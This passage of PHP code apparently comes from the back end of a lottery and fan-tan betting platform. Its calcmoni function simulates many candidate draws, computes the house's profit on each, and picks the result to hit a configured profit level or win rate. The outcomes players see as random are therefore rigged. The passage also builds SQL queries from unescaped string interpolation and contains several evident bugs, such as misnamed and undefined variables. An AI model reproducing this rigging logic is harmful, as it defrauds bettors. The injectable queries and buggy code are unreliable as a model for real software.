                                if ($flag[0] == 1) {
                                    foreach ($pei as $kb => $vb) {
                                        if ($kb == 0) {
                                            $sql .= "peilv1='{$pei[0][0]}',";
                                        } else {
                                            $sql .= "peilv1{$kb}='" . $pei[$kb][0] . "',";
                                        }
                                    }
                                } else {
                                    foreach ($pei as $kb => $vb) {
                                        if ($kb == 0) {
                                            $sql .= "peilv1='{$pei[0][1]}',";
                                        } else {
                                            $sql .= "peilv1{$kb}='" . $pei[$kb][1] . "',";
                                        }
                                    }
                                }
                                Db::query("update `{$tb_lib}` set $sql" . "z=1,kk=1 where id='{$va['id']}'");
                            }
                        } else {
                            Db::query("update `{$tb_lib}` set kk=1,z='{$flag[0]}' where {$whi} and pid='{$lib[$j]['pid']}' and content='{$lib[$j]['content']}' and z!=7 ");
                        }
                    } else {
                        Db::query("update `{$tb_lib}` set kk=1,z='{$flag[0]}' where {$whi} and pid='{$lib[$j]['pid']}' and z!=7 ");
                        if ($flag[0] == 1) {
                            Db::query("insert into `{$tb_z}` set gid='{$gid}',pid='{$lib[$j]['pid']}',qishu='{$qishu}'");
                        }
                    }
                }
            }
            $tmpcid = $lib[$j]['cid'];
        }
        Db::query("update `{$tb_kj}` set js=1 where {$whi}");
        jiaozhengedu();
    }
    $us = Db::query("select * from `$tb_shui` where isok=1 and shui>0");
    foreach ($us as $k => $v) {
        $val = $v["shui"];
        if ($v['stype'] == 1) {
            Db::query("update `$tb_lib` set peilv1=peilv1-$val,peilv11=peilv11-$val,peilv12=if(peilv12-$val<0,0,peilv12-$val),peilv13=if(peilv13-$val<0,0,peilv13-$val),peilv14=if(peilv14-$val<0,0,peilv14-$val),peilv15=if(peilv15-$val<0,0,peilv15-$val),peilv16=if(peilv16-$val<0,0,peilv16-$val),peilv17=if(peilv17-$val<0,0,peilv17-$val),peilv18=if(peilv18-$val<0,0,peilv18-$val),prize=0,kk=1 where {$whi} and userid='{$v['userid']}' and z=1 and zc0>0");
        } else {
            $zuix = $v['zuix'];
            $zuid = $v['zuid'];
            Db::query("update `$tb_lib` set prize=floor(peilv1*$val*je),kk=1 where {$whi} and userid='{$v['userid']}' and z=1 and zc0>0");
            Db::query("update `$tb_lib` set prize=if(prize>$zuid,$zuid,prize),kk=1 where {$whi} and userid='{$v['userid']}' and z=1 and zc0>0");
            Db::query("update `$tb_lib` set prize=if(prize<$zuix,0,prize),kk=1 where {$whi} and userid='{$v['userid']}' and z=1 and zc0>0");
        }
    }
    return $tmpcid;
}
function calcmoni($fenlei, $gid, $cs, $qishu, $mnum, $ztype, $mtype)
{
    global $fsql, $tsql, $psql, $tb_bclass, $tb_sclass, $tb_class, $tb_play, $tb_lib, $tb_user, $tb_config, $tb_game;
    $uid = 0;
    if ($cs['zhiding'] != 0) {
        //$arr = Db::query("select userid from `{$tb_user}` where username='" . $cs['zduser'] . "'", 1);
        //$uid = $arr[0]['userid'];
    }

    if ($cs['zcmode'] == 1) {
        $sql = "select bid,sid,cid,pid,content,bz,ab,userid,sum(je*zc0/100) as jes,sum(je*(zc0/100)*peilv1) as z1,sum(je*(zc0/100)*peilv2) as z2,sum(je*(zc0/100)*points/100) as shui,bz,dates from `{$tb_lib}` where gid='{$gid}' and qishu='{$qishu}' group by cid,pid,content";
    } else {
        $sql = "select bid,sid,cid,pid,content,bz,ab,userid,sum(je) as jes,sum(je*peilv1) as z1,sum(je*peilv2) as z2,sum(je*points/100) as shui,bz,dates from `{$tb_lib}` where gid='{$gid}' and qishu='{$qishu}' group by cid,pid,content";
    }
    $lib = Db::query($sql, 1);
    $cl = count($lib);
    $zje = 0;
    foreach ($lib as $v) {
        $zje += $v['jes'];
    }
    if ($zje < $cs['kongje'] || $cs['xtmode'] == 0 || $cl == 0) {
        return suiji($fenlei, $gid, $qishu);
    }
    if ($cs["ylup"] > 0) {
        $dates = $lib[0]['dates'];
        $tsql->query("select sum(je*zc0/100),sum(if(z=1,peilv11,0)*je*zc0/100),sum(je*zc0*points1/100*100) from `$tb_lib` where gid='$gid' and dates='$dates' and z in(0,1)");
        $tsql->next_record();
        $zje = $tsql->f(0);
        $points = $tsql->f(2);
        $zhong = $tsql->f(1);
        $yk = $zje - $points - $zhong;
        if ($yk > $cs["ylup"]) {
            return suiji($fenlei, $gid, $qishu);
        }
    }
    $kj = [];
    $tmp = [];
    $ftm = [];
    if ($cs['ft'] == 1) {
        $ftm = explode(',', $cs['ftnum']);
    }
    $lastcode = $tsql->f("m8");
    $marr = [];
    $y1 = [];
    $y2 = [];
    $sy1 = [];
    $sy2 = [];
    if ($fenlei == 100) {
        $rs = Db::query("select ma,maxpc from `{$tb_config}`", 0);
        $marrs = json_decode($rs[0][0], true);
        foreach ($marrs as $v) {
            foreach ($v as $k1 => $v1) {
                $marr[$k1] = explode(',', $v1);
            }
        }
        $marr['pc'] = $rs[0][1];
    }
    $jiang = [];
    $usy = [];
    for ($i = 0; $i < $cs['suiji']; $i++) {
        $kj[$i]['m'] = suiji($fenlei, $gid, $qishu);
        //echo json_encode($kj[$i]['m']),"<bR>";
        $jiang[$i] = 0;
        $usy[$i] = 0;
        $ft = 0;
        if ($cs['ft'] == 1) {
            // $ft = getft($kj[$i]['m'],$cs);
            $ft = $lastcode % 4 == 0 ? 4 : $lastcode % 4;
        }
        $sx = [];
        $ws = [];
        if ($fenlei == 100) {
            foreach ($kj[$i]['m'] as $ks => $vs) {
                $sx[] = sx_100($vs, $marr);
                $ws[] = $vs % 10;
            }
        }
        for ($j = 0; $j < $cl; $j++) {
            if ($fenlei == 100 && ($lib[$j]['bid'] == '26000004' || $lib[$j]['bid'] == '23378733')) {
                continue;
            }
            if ($tmpcid != $lib[$j]['cid']) {
                if (!isset($tmp['c' . $lib[$j]['cid']])) {
                    $tsql->query("select name,mtype from `{$tb_class}` where gid='{$gid}' and cid='{$lib[$j]['cid']}'");
                    $tsql->next_record();
                    $tmp['c' . $lib[$j]['cid']]['name'] = $tsql->f('name');
                    $tmp['c' . $lib[$j]['cid']]['mtype'] = $tsql->f('mtype');
                    $tmp['c' . $lib[$j]['cid']]['cm'] = $mtype[$tsql->f('mtype')];
                }
                if (!isset($tmp['s' . $lib[$j]['sid']])) {
                    $tmp['s' . $lib[$j]['sid']] = transs8('name', $lib[$j]['sid'], $gid);
                }
                if (!isset($tmp['b' . $lib[$j]['bid']])) {
                    $tmp['b' . $lib[$j]['bid']] = transb8('name', $lib[$j]['bid'], $gid);
                }
            }
            if (!isset($tmp['p' . $lib[$j]['pid']])) {
                $tsql->query("select name,ztype,znum1,znum2 from `{$tb_play}` where gid='{$gid}' and pid='{$lib[$j]['pid']}'");
                $tsql->next_record();
                $tmp['p' . $lib[$j]['pid']]['name'] = $tsql->f("name");
                $tmp['p' . $lib[$j]['pid']]['ztype'] = $ztype[$tsql->f("ztype")];
                $tmp['p' . $lib[$j]['pid']]['znum1'] = $tsql->f('znum1');
                $tmp['p' . $lib[$j]['pid']]['znum2'] = $tsql->f('znum2');
            }
            $flag = calcjs($fenlei, $gid, $kj[$i]['m'], $tmp['b' . $lib[$j]['bid']], $tmp['s' . $lib[$j]['sid']], $tmp['c' . $lib[$j]['cid']], $tmp['p' . $lib[$j]['pid']], $tmp['p' . $lib[$j]['content']], $ft, $marr, $sx, $ws);
            //echo $flag[0],",";
            switch ($flag[0]) {
                case '1':
                    $jiang[$i] += $lib[$j]['jes'] - $lib[$j]['z1'] - $lib[$j]['shui'];
                    break;
                case '3':
                    $jiang[$i] += $lib[$j]['jes'] - $lib[$j]['z2'] - $lib[$j]['shui'];
                    break;
                case '2':
                    $jiang[$i] += 0;
                    break;
                case '0':
                    $jiang[$i] += $lib[$j]['jes'] - $lib[$j]['shui'];
                    break;
            }
            if ($cs['zhiding'] != 0 && is_numeric($uid) && $uid > 10000000 && 1 == 2) {
                if ($lib[$j]['content'] != "") {
                    $psql->query("select sum(je) as jes,sum(je*peilv1) as z1,sum(je*peilv2) as z2,sum(je*points/100) as shui,bz from `{$tb_lib}` where {$whi} and userid='{$uid}' and pid='{$lib[$j]['pid']}' and content='{$lib[$j]['content']}'");
                } else {
                    $psql->query("select sum(je) as jes,sum(je*peilv1) as z1,sum(je*peilv2) as z2,sum(je*points/100) as shui,bz from `{$tb_lib}` where {$whi} and userid='{$uid}' and pid='{$lib[$j]['pid']}'");
                }
                $psql->next_record();
                switch ($flag[0]) {
                    case '1':
                        $usy[$i] += $psql->f('z1') + $psql->f('shui') - $psql->f('jes');
                        break;
                    case '3':
                        $usy[$i] += $psql->f('z2') + $psql->f('shui') - $psql->f('jes');
                        break;
                    case '2':
                        $usy[$i] += 0;
                        break;
                    case '0':
                        $usy[$i] += $psql->f('shui') - $psql->f('jes');
                        break;
                }
            }
            $tmpcid = $lib[$j]['cid'];
        }
        $jiang[$i] > 0 ? $y1[] = $jiang[$i] : ($y2[] = $jiang[$i]);
        $usy[$i] > 0 ? $sy1[] = $usy[$i] : ($sy2[] = $usy[$i]);
    }
    /*
    for ($i = 0; $i < $cs['suiji']; $i++) {
        $kj[$i]['jj'] = $jiang[$i];
        $kj[$i]['mm'] = implode(',', $kj[$i]['m']);
    }
    */
    sort($y1);
    sort($y2);
    $v = 0;
    switch ($cs['xtmode']) {
        case '3':
            $v = $y1[rand(0, count($y1) - 1)];
            break;
        case '2':
            $v = $y1[count($y1) - 1];
            break;
        case '1':
            $v = $y1[0];
            break;
        case '-1':
            $v = $y2[count($y2) - 1];
            break;
        case '-2':
            $v = $y2[0];
            break;
        case '-3':
            $v = $y2[rand(0, count($y2) - 1)];
            break;
        case '5':
            $totalqs = floor($cs["shenglv"] / 10);
            $zhongqs = $cs["shenglv"] % 10;
            $buzhongqs = $totalqs - $zhongqs;
            if ($cs["yingqs"] + $cs["shuqs"] == $totalqs) {
                $cs["yingqs"] = 0;
                $cs["shuqs"] = 0;
            }

            $v = $jiang[rand(0, $cs['suiji'] - 1)];
            $v < 0 ? $cs["shuqs"]++ : $cs["yingqs"]++;
            if ($cs["yingqs"] > $buzhongqs) {
                $cs["yingqs"]--;
                $v = $y2[rand(0, count($y2) - 1)];
                $cs["shuqs"]++;
            }

            if ($cs["shuqs"] > $zhongqs) {
                $cs["shuqs"]--;
                $v = $y1[rand(0, count($y1) - 1)];
                $cs["yingqs"]++;
            }
            //$cs["v"] = $cs["v"].",".$v;
            $cs = json_encode($cs);
            $psql->query("update `$tb_game` set cs='$cs' where gid='$gid'");
            break;
    }
    $key = array_search($v, $jiang);
    return $kj[$key]['m'];
}
function calcjs($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft, $marr, $sx, $ws)
{
    switch ($fenlei) {
        case '101':
            return moni_101($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft);
            break;
        case '107':
            return moni_107($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft);
            break;
        case '151':
            return moni_151($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft);
            break;
        case '161':
            return moni_161($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft);
            break;
        case '163':
            return moni_163($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft);
            break;
        case '121':
            return moni_121($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft);
            break;
        case '103':
            return moni_103($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft);
            break;
        case '100':
            return moni_100($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft, $marr, $sx, $ws);
            break;
    }
}
function moni_100($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft, $marr, $sx, $ws)
{
    $v = 0;
    $jj = 0;
    if ($c['mtype'] == 0) {
        $c['mtype'] = 6;
    } else if ($c['mtype'] <= 6) {
        $c['mtype'] -= 1;
    }
    switch ($p['ztype']) {
        case '番摊':
            switch ($c['name']) {
                case "双面":
                    if ($p['name'] == "单" && $ft % 2 == 1) {
                        $v = 1;
                    } else {
                        if ($p['name'] == "双" && $ft % 2 == 0) {
                            $v = 1;
                        } else {
                            if ($p['name'] == "大" && $ft > 2) {
                                $v = 1;
                            } else {
                                if ($p['name'] == "小" && $ft < 3) {
                                    $v = 1;
                                }
                            }
                        }
                    }
                    break;
                case "番":
                    $ft . "番" == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "念":
                    $ps = explode('念', $p["name"]);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if ($ps[1] == $ft) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case "角":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case "正":
                    $ps = str_replace('正', '', $p['name']);
                    if ($ps > 2) {
                        $psdui = $ps - 2;
                    } else {
                        $psdui = $ps + 2;
                    }
                    if ($ps == $ft) {
                        $v = 1;
                    } else {
                        if ($psdui == $ft) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "中":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case '加':
                    $ps = explode('加', $p['name']);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if (strpos($ps[1], $ft . "") !== false) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                default:
                    if ($p['znum1'] == $ft) {
                        $v = 0;
                    } else {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
            }
            break;
        case '码':
        case '碼':
            ($b == '正码' || $b == '正碼') ? $arr = [$kj[0], $kj[1], $kj[2], $kj[3], $kj[4], $kj[5]] : ($arr = [$kj[$c['mtype']]]);
            in_array($p['name'], $arr) && ($v = 1);
            break;
        case '单双':
        case '單雙':
            if ($c['name'] == '总单双' || $c['name'] == '總單雙') {
                $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4] + $kj[5] + $kj[6];
                strpos($p['name'], danshuang_100($ma)) !== false && ($v = 1);
            } else {
                $ma = $kj[$c['mtype']];
                if ($ma == 49) {
                    $v = 2;
                } else {
                    strpos($p['name'], danshuang_100($ma)) !== false && ($v = 1);
                }
            }
            break;
        case '大小':
            if ($c['name'] == '总大小' || $c['name'] == '總大小') {
                $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4] + $kj[5] + $kj[6];
                (($p['name'] == '总大' || $p['name'] == '總大') && $ma > 174) && ($v = 1);
                (($p['name'] == '总小' || $p['name'] == '總小') && $ma < 175) && ($v = 1);
            } else {
                $ma = $kj[$c['mtype']];
                if ($ma == 49) {
                    $v = 2;
                } else {
                    $p['name'] == '大' && $ma >= 25 && ($v = 1);
                    $p['name'] == '小' && $ma <= 24 && ($v = 1);
                }
            }
            break;
        case '合单双':
        case '合單雙':
            $ma = heshu($kj[$c['mtype']]);
            if ($kj[$c['mtype']] == 49) {
                $v = 2;
            } else {
                (strpos($p['name'], danshuang_100($ma)) !== false) && ($v = 1);
            }
            break;
        case "波色":
            in_array($kj[$c['mtype']], $marr[$p['name']]) && ($v = 1);
            break;
        case '尾大小':
            $ma = $kj[$c['mtype']];
            if ($c['name'] == "合尾大小") {
                if ($ma == 25) {
                    $v = 2;
                } else {
                    $hs = heshu($ma);
                    (strpos($p['name'], daxiaow($hs % 10)) !== false) && ($v = 1);
                }
            } else {
                if ($ma == 49) {
                    $v = 2;
                } else {
                    (strpos($p['name'], daxiaow($ma % 10)) !== false) && ($v = 1);
                }
            }
            break;
        case '合大小':
            $ma = heshu($kj[$c['mtype']]);
            if ($kj[$c['mtype']] == 49) {
                $v = 2;
            } else {
                ($p['name'] == heshudaxiao_100($ma)) && ($v = 1);
            }
            break;
        case "家野":
            $ma = $kj[$c['mtype']];
            if ($ma == 49) {
                $v = 2;
            } else {
                in_array($ma, $marr[$p['name']]) && ($v = 1);
            }
            break;
        case "半波":
            if ($kj[$c['mtype']] == 49) {
                $v = 2;
            } else {
                in_array($kj[$c['mtype']], $marr[$p['name']]) && ($v = 1);
            }
            break;
        case "五行":
            in_array($kj[$c['mtype']], $marr[$p['name']]) && ($v = 1);
            break;
        case '生肖':
            if ($b == '一肖') {
                $arr = $kj;
            } else {
                if ($b == '正肖') {
                    $arr = [$kj[0], $kj[1], $kj[2], $kj[3], $kj[4], $kj[5]];
                } else {
                    $arr = [$kj[6]];
                }
            }
            $zflag = 0;
            foreach ($arr as $vv) {
                if (in_array($vv, $marr[$p['name']])) {
                    $zflag += 1;
                }
            }
            if ($zflag >= 1) {
                /*if ($b == "正肖") {
                    $v = 5;
                    $jj = $zflag;
                } else {*/
                $v = 1;
                //}
            }
            break;
        case '尾数':
        case '尾數':
            $b == "特头尾" ? $arr = [$kj[6]] : ($arr = $kj);
            $zflag = 0;
            foreach ($arr as $vv) {
                if (in_array($vv, $marr[$p['name']])) {
                    $zflag = 1;
                    break;
                }
            }
            $zflag == 1 && ($v = 1);
            break;
        case "其他":
            if ($b == "总肖七色波") {
                $zx = array_count_values($sx);
                $czx = count($zx);
                switch ($c['name']) {
                    case '总肖':
                        $p['znum1'] == $czx && ($v = 1);
                        break;
                    case '总肖单双':
                        strpos($p['name'], danshuang($czx)) !== false && ($v = 1);
                        break;
                    default:
                        $hob = 0;
                        $lao = 0;
                        $lvb = 0;
                        for ($i = 0; $i < 6; $i++) {
                            in_array($kj[$i], $marr["紅"]) && $hob++;
                            in_array($kj[$i], $marr["藍"]) && $lab++;
                            in_array($kj[$i], $marr["綠"]) && $lvb++;
                        }
                        in_array($kj[6], $marr["紅"]) && ($hob += 1.5);
                        in_array($kj[6], $marr["藍"]) && ($lab += 1.5);
                        in_array($kj[6], $marr["綠"]) && ($lvb += 1.5);
                        $p['name'] == "和局" && ($hob == 3 && $lab == 3 && $lvb == 1.5 || $hob == 3 && $lvb == 3 && $lab == 1.5 || $lvb == 3 && $lab == 3 && $hob == 1.5) && ($v = 1);
                        $p['name'] != "和局" && ($hob == 3 && $lab == 3 && $lvb == 1.5 || $hob == 3 && $lvb == 3 && $lab == 1.5 || $lvb == 3 && $lab == 3 && $hob == 1.5) && ($v = 2);
                        $p['name'] == "红波" && $hob == max($hob, $lab, $lvb) && ($v = 1);
                        $p['name'] == "蓝波" && $lab == max($hob, $lab, $lvb) && ($v = 1);
                        $p['name'] == "绿波" && $lvb == max($hob, $lab, $lvb) && ($v = 1);
                        break;
                }
            } else {
                switch ($c['name']) {
                    case '特头数':
                        $p['name'] == floor($kj[$c['mtype']] / 10) . "头" && ($v = 1);
                        break;
                    case '特尾数':
                        $p['name'] == $kj[$c['mtype']] % 10 . "尾" && ($v = 1);
                        break;
                }
            }
            break;
        case '多肖':
            if ($b == '特肖连' | $b == '合肖') {
                if ($kj[6] == 49 && $p['znum1'] == 6) {
                    $v = 2;
                    break;
                }
                $cons = explode('-', $con);
                $cons = array_unique($cons);
                $cc = count($cons);
                $zflag = 0;
                foreach ($cons as $vv) {
                    if (in_array($kj[6], $marr[$vv])) {
                        $zflag = 1;
                        break;
                    }
                }
                if ($p['znum2'] < 0) {
                    $zflag == 0 && ($v = 1);
                } else {
                    $zflag == 1 && ($v = 1);
                }
            } else {
                $cons = explode('-', $con);
                $cons = array_unique($cons);
                $cc = count($cons);
                $zflag = 0;
                foreach ($cons as $vv) {
                    if (in_array($vv, $sx)) {
                        $zflag++;
                    }
                }
                if ($p['znum2'] >= 0) {
                    $zflag == $p['znum1'] && ($v = 1);
                } else {
                    $zflag == 0 && ($v = 1);
                }
            }
            break;
        case '多尾':
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            $zflag = 0;
            foreach ($cons as $vv) {
                if (in_array(str_replace('尾', '', $vv), $ws)) {
                    $zflag++;
                }
            }
            if ($p['znum2'] >= 0) {
                $zflag == $p['znum1'] && ($v = 1);
            } else {
                $zflag == 0 && ($v = 1);
            }
            break;
        case '多不中':
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            $zflag = 1;
            foreach ($cons as $vv) {
                if (in_array($vv, $kj)) {
                    $zflag = 0;
                    break;
                }
            }
            $zflag == 1 && ($v = 1);
            break;
        case '多码':
        case '多碼':
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if ($cc != $p['znum1'] && $cc != $p['znum2']) {
                break;
            }
            $arr = [$kj[0], $kj[1], $kj[2], $kj[3], $kj[4], $kj[5]];
            switch ($p['name']) {
                case '特串':
                    if ((in_array($cons[0], $arr) && $cons[1] == $kj[6]) || (in_array($cons[1], $arr) && $cons[0] == $kj[6])) {
                        ($v = 1);
                    }
                    break;
                case '二中特':
                    in_array($cons[0], $arr) && in_array($cons[1], $arr) && $cons[0] != $cons[1] && ($v = 1);
                    ($cons[0] == $kj[6] || $cons[1] == $kj[6]) && $con[0] != $con[1] && ($v = 3);
                    break;
                default:
                    $zflag = 0;
                    foreach ($cons as $vv) {
                        if (in_array($vv, $arr)) {
                            $zflag++;
                        }
                    }
                    if ($p['name'] == '三中二') {
                        if ($zflag == 2) {
                            $v = 1;
                        }
                        if ($zflag == 3) {
                            $v = 3;
                        }
                    } else {
                        $zflag == $p['znum1'] && ($v = 1);
                    }
                    break;
            }
            break;
    }
    return [$v, $jj];
}
function moni_121($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft)
{
    $v = 0;
    switch ($p['ztype']) {
        case '番摊':
            switch ($c['name']) {
                case "双面":
                    if ($p['name'] == "单" && $ft % 2 == 1) {
                        $v = 1;
                    } else {
                        if ($p['name'] == "双" && $ft % 2 == 0) {
                            $v = 1;
                        } else {
                            if ($p['name'] == "大" && $ft > 2) {
                                $v = 1;
                            } else {
                                if ($p['name'] == "小" && $ft < 3) {
                                    $v = 1;
                                }
                            }
                        }
                    }
                    break;
                case "番":
                    $ft . "番" == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "念":
                    $ps = explode('念', $p["name"]);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if ($ps[1] == $ft) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case "角":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case "正":
                    $ps = str_replace('正', '', $p['name']);
                    if ($ps > 2) {
                        $psdui = $ps - 2;
                    } else {
                        $psdui = $ps + 2;
                    }
                    if ($ps == $ft) {
                        $v = 1;
                    } else {
                        if ($psdui == $ft) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "中":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case '加':
                    $ps = explode('加', $p['name']);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if (strpos($ps[1], $ft . "") !== false) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                default:
                    if ($p['znum1'] == $ft) {
                        $v = 0;
                    } else {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
            }
            break;
        case '码':
            $b == '正码' ? $ma = $kj : ($ma = [$kj[$c['mtype']]]);
            in_array($p['name'], $ma) ? $v = 1 : ($v = 0);
            break;
        case '单双':
            $c['name'] == '总和单双' ? $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4] : ($ma = $kj[$c['mtype']]);
            strpos($p['name'], danshuang($ma)) !== false ? $v = 1 : ($v = 0);
            break;
        case '大小':
            $v = 0;
            if ($c['name'] == '总和大小') {
                $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4];
                $p['name'] == '总和大' && $ma > 30 && ($v = 1);
                $p['name'] == '总和小' && $ma < 30 && ($v = 1);
                $ma == 30 && ($v = 2);
            } else {
                $ma = $kj[$c['mtype']];
                $p['name'] == '小' && $ma <= 5 && ($v = 1);
                $p['name'] == '大' && $ma >= 6 && ($v = 1);
                $ma == 11 && ($v = 2);
            }
            break;
        case '尾大小':
            $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4];
            strpos($p['name'], daxiaow($ma % 10)) !== false && ($v = 1);
            break;
        case '龙虎':
            $ma = longhuhe($kj[0], $kj[4]);
            $ma == $p ? $v = 1 : $v == 0;
            break;
        case '连码':
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($con);
            if ($cc != $p['znum1']) {
                break;
            }
            switch ($p['name']) {
                case '任选二中二':
                    in_array($cons[0], $kj) && in_array($cons[1], $kj) && ($v = 1);
                    break;
                case '任选三中三':
                    in_array($cons[0], $kj) && in_array($cons[1], $kj) && in_array($cons[2], $kj) && ($v = 1);
                    break;
                case '任选四中四':
                    in_array($cons[0], $kj) && in_array($cons[1], $kj) && in_array($cons[2], $kj) && in_array($cons[3], $kj) && ($v = 1);
                    break;
                case '任选五中五':
                case '任选六中五':
                case '任选七中五':
                case '任选八中五':
                    in_array($kj[0], $cons) & in_array($kj[1], $cons) & in_array($kj[2], $cons) & in_array($kj[3], $cons) & in_array($kj[4], $cons) && ($v = 1);
                    break;
                case '选前二组选':
                    $arr = [$kj[0], $kj[1]];
                    in_array($cons[0], $arr) && in_array($cons[1], $arr) && ($v = 1);
                    break;
                case '选前二直选':
                    $cons[0] == $kj[0] && $cons[1] == $kj[1] && ($v = 1);
                    break;
                case '选前三组选':
                    $arr = [$kj[0], $kj[1], $kj[2]];
                    in_array($cons[0], $arr) && in_array($cons[1], $arr) && in_array($cons[2], $arr) && ($v = 1);
                    break;
                case '选前三直选':
                    $cons[0] == $kj[0] && $cons[1] == $kj[1] && $cons[2] == $kj[2] && ($v = 1);
                    break;
            }
            break;
    }
    return [$v];
}
function moni_161($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft)
{
    $v = 0;
    switch ($p['ztype']) {
        case '番摊':
            switch ($c['name']) {
                case "双面":
                    if ($p['name'] == "单" && $ft % 2 == 1) {
                        $v = 1;
                    } else {
                        if ($p['name'] == "双" && $ft % 2 == 0) {
                            $v = 1;
                        } else {
                            if ($p['name'] == "大" && $ft > 2) {
                                $v = 1;
                            } else {
                                if ($p['name'] == "小" && $ft < 3) {
                                    $v = 1;
                                }
                            }
                        }
                    }
                    break;
                case "番":
                    $ft . "番" == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "念":
                    $ps = explode('念', $p["name"]);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if ($ps[1] == $ft) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case "角":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case "正":
                    $ps = str_replace('正', '', $p['name']);
                    if ($ps > 2) {
                        $psdui = $ps - 2;
                    } else {
                        $psdui = $ps + 2;
                    }
                    if ($ps == $ft) {
                        $v = 1;
                    } else {
                        if ($psdui == $ft) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "中":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case '加':
                    $ps = explode('加', $p['name']);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if (strpos($ps[1], $ft . "") !== false) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                default:
                    if ($p['znum1'] == $ft) {
                        $v = 0;
                    } else {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
            }
            break;
        case '正码':
            in_array($p['name'], $kj) && ($v = 1);
            break;
        case '总和':
            $ma = 0;
            $qma = 0;
            $dma = 0;
            for ($i = 0; $i < 20; $i++) {
                $kj[$i] <= 40 && $xma++;
                $kj[$i] % 2 == 1 && $dma++;
                $ma += $kj[$i];
            }
            switch ($c['name']) {
                case "总和单双":
                    strpos($p['name'], danshuang($ma)) !== false && ($v = 1);
                    break;
                case "总和大小":
                    $p['name'] == '总和大' && $ma > 810 && ($v = 1);
                    $p['name'] == '总和小' && $ma < 810 && ($v = 1);
                    $ma == 810 && ($v = 2);
                    break;
                case "总和810":
                    $ma == 810 && ($v = 1);
                    break;
                case "总和过关":
                    if ($ma == 810) {
                        $v = 2;
                    } else {
                        $tmp = danshuang($ma);
                        $p['name'] == '总大单' && $tmp == "单" && $ma > 810 && ($v = 1);
                        $p['name'] == '总大双' && $tmp == "双" && $ma > 810 && ($v = 1);
                        $p['name'] == '总小单' && $tmp == "单" && $ma < 810 && ($v = 1);
                        $p['name'] == '总小双' && $tmp == "双" && $ma < 810 && ($v = 1);
                    }
                    break;
                case "单双和":
                    $p['name'] == "单(多)" && $dma > 10 && ($v = 1);
                    $p['name'] == "双(多)" && $dma < 10 && ($v = 1);
                    $p['name'] == "单双(和)" && $dma == 10 && ($v = 1);
                    break;
                case "前后和":
                    $p['name'] == "前(多)" && $dma > 10 && ($v = 1);
                    $p['name'] == "后(多)" && $dma < 10 && ($v = 1);
                    $p['name'] == "前后(和)" && $dma == 10 && ($v = 1);
                    break;
            }
            break;
        case '五行':
            $ma = 0;
            for ($i = 0; $i < 20; $i++) {
                $ma += $kj[$i];
            }
            wuhang_161($ma) == $p['name'] && ($v = 1);
            break;
    }
    return [$v];
}
function moni_151($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft)
{
    $v = 0;
    switch ($p['ztype']) {
        case '码':
            in_array($p['name'], $kj) && ($v = 1);
            break;
        case '骰':
            if ($p["name"] == "全骰") {
                baozhi($kj[0], $kj[1], $kj[2]) == 1 && ($V = 1);
            } else {
                baozhi($kj[0], $kj[1], $kj[2]) == 1 & $kj[0] == $p['name'] % 10 && ($v = 1);
            }
            break;
